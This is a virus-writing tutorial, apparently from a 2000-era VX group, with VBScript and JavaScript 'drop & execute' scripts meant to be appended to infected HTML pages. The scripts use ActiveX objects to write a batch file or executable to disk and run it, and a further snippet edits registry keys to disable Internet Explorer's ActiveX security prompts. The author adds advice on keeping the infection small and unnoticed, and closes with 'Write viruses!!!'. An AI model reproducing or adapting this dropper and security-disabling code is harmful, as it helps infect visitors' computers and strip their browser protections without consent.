 ' Virus Script by ULTRAS [MATRiX] : drop & execute file.
 <script Language="VBScript"><!--
 ' Ä Virus script start here:
 Dim a,f,s
 Set a = CreateObject("Wscript.Shell")
 Set f = CreateObject("Scripting.FileSystemObject")
 Set s = f.CreateTextFile("ultras.bat", 2, False)
 ' Ä create ultras.bat file and let's write down theree debug script :
 s.WriteLine "@echo off"
 s.WriteLine "ctty nul"
 ' Ä u debug script start here : 
 s.WriteLine "ECHO E0100 BA 4B 02 BA 58 02 E8 54 00 BA ... etc >>virus.scr"
 s.WriteLine "ECHO u debug script ............................ >>virus.scr"
 ' Ä End Debug script :
 s.WriteLine "ECHO g >>fire.scr"
 s.WriteLine "ECHO q >>fire.scr"
 s.WriteLine "debug<fire.scr"
 s.WriteLine "del fire.scr"
 s.WriteLine "ctty con"
 ' Ä close file :
 s.Close
 ' Ä Execute ultras.bat :
 a.Run ("ultras.bat")
 --></script>
 ' Ä end virus script

 
 The small example Virus script which should be written down right at the end 
 of infected html of a file... All is very simple...

 I have resulted an example with use standard debug script.

 þ JavaScript:

 <!-- Virus script by ULTRAS [MATRiX] : drop & execute file. //-->
 <script language=javascript>
 var s = new ActiveXObject("Scripting.FileSystemObject").CreateTextFile("c:\\ultras.exe");
 ' Ä create c:\ultras.exe file and write u debug script :
 s.WriteLine("You Debug Script");
 s.WriteLine("You Debug Script");
 ' Ä End Debug script :
 s.Close();
 ' Ä close file :
 new ActiveXObject("Wscript.Shell").Run("c:\\ultras.exe");
 ' Ä Execute ultras.exe :
 </script>
 ' Ä end virus script

  So  looks Virus Script  written on  Java ... I did not begin to  write what 
  example or  debug script, I simply  have written  where it(he)  should bee.


  % Advice %
  **********
 
  At a spelling of viruses infecting html files Virus Script and Debug script 
  should not be more > 10 kb... It can slow down loading html file (web page)
  As I do not advise to use Debug script because it does(makes) very large 
  Virus Debug script... It is better to use script which were offered Vecna, 
  Z0MBiE, T2000 and it is better to write the algorithm...

  As in a virus it is possible to register parameters which will disconnect 
  protection IE on start HTML of files in which is script:

  Exemple:      

  
  <script Language="VBScript"><!--
  Set A = CreateObject("WScript.Shell")
  A.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
  \Zones\0\1201" , 0, "REG_DWORD"
  A.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion
  \Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
  --></script>


  % Last Word %
  ************* 

  Forgive me for mine englsih language I know the native language is very bad, 
  it not minee...

  If you had questions or you wanted that that to learn(find out) write more 
  in detail to me is always glad I shall answer...

  e-mail: ultras@matrixvx.org or ultras2@hotmail.com
  web: www.coderz.net/ultras
  irc: Undernet channel: #virus, #vir, #mtx, #smf
       EFNet channel   : #virus, #coders.ru
       nickname        : [ULTRAS] or ULTRAS


  New technology by MATRiX TeAm...
  Write viruses!!!


  ULTRAS [MATRiX]
    (c) 2000